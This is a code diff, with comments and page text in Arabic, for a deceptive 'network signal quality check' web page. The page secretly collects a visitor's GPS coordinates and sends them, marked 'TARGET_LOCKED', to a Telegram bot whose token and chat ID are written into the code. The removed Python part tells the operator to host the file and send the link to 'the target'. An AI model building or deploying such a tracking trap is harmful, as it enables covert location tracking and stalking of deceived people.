@@ -1,48 +1,39 @@
-import requests
-import os
-
-# --- DATA_CORE ---
-BOT_TOKEN = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU"
-CHAT_ID = "8397194527"
-
-def generate_trap_page():
-    # بناء سكريبت الجافا سكريبت الذي سيسحب الموقع ويرسله للتليجرام مباشرة
-    js_payload = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>فحص جودة إشارة الشبكة</title>
+</head>
+<body>
     <script>
-    window.onload = function() {{
-        if (navigator.geolocation) {{
-            navigator.geolocation.getCurrentPosition(sendPosition, showError);
-        }} else {{
-            alert("المتصفح لا يدعم تحديد الموقع.");
-        }}
-    }};
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                alert("المتصفح لا يدعم هذا التحديث.");
+            }
+        };
 
-    function sendPosition(position) {{
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-        var acc = position.coords.accuracy;
-        var msg = "🎯 [TARGET_LOCKED]\\n📍 Lat: " + lat + "\\n📍 Lon: " + lon + "\\n🎯 Accuracy: " + acc + " meters\\n🔗 Map: https://www.google.com/maps?q=" + lat + "," + lon;
-        
-        fetch("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=" + encodeURIComponent(msg));
-    }}
+        function sendPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var acc = position.coords.accuracy;
+            var token = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+            var id = "8397194527";
+            var msg = "🎯 [TARGET_LOCKED]\n📍 Lat: " + lat + "\n📍 Lon: " + lon + "\n🎯 Accuracy: " + acc + "m\n🔗 Map: https://www.google.com/maps?q=" + lat + "," + lon;
+            
+            fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(msg));
+            document.body.innerHTML = "<h1>تم تحديث إشارة الشبكة بنجاح ✅</h1>";
+        }
 
-    function showError(error) {{
-        fetch("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Target_Denied_Permission");
-    }}
+        function showError(error) {
+            var token = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+            var id = "8397194527";
+            fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + id + "&text=Target_Denied_Permission");
+            document.body.innerHTML = "<h1>فشل التحديث: يرجى السماح بالوصول للموقع</h1>";
+        }
     </script>
-    <h1>جاري فحص جودة إشارة الشبكة... يرجى الانتظار</h1>
-    """
-    
-    with open("index.html", "w", encoding="utf-8") as f:
-        f.write(js_payload)
-    print("[+] تم بناء ملف index.html بنجاح.")
+    <h1 style="text-align:center;">جاري فحص جودة إشارة الشبكة... يرجى الانتظار</h1>
+</body>
+</html>
 
-def send_alert_to_bot():
-    msg = "🚀 الأداة جاهزة! قم برفع ملف `index.html` إلى أي استضافة وأرسل الرابط للهدف."
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
-    requests.get(url)
 
-if __name__ == "__main__":
-    generate_trap_page()
-    send_alert_to_bot()
-    print("[!] تم إرسال تنبيه التشغيل إلى البوت.")
